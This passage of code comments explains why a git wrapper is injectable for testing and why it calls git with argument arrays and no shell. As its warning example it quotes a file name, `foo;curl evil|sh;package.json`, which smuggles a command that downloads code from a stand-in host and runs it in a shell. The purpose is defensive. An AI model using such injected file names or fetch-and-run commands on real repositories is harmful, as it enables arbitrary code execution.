// misplaced responsibility.
//
// The git port is the important part. Every fail-open bug in this system has lived in a
// composition that shells out to git, and those compositions were untestable because the
// shelling was private. `makeGit` is injectable: pass `exec` and the composition becomes a
// pure function of recorded git output.

// SECURITY: git runs with an argv array and NO shell. Paths are arguments, never
// interpolated into command text — a file named `foo;curl evil|sh;package.json` was
// otherwise arbitrary code execution in any repo an agent merely inspected.
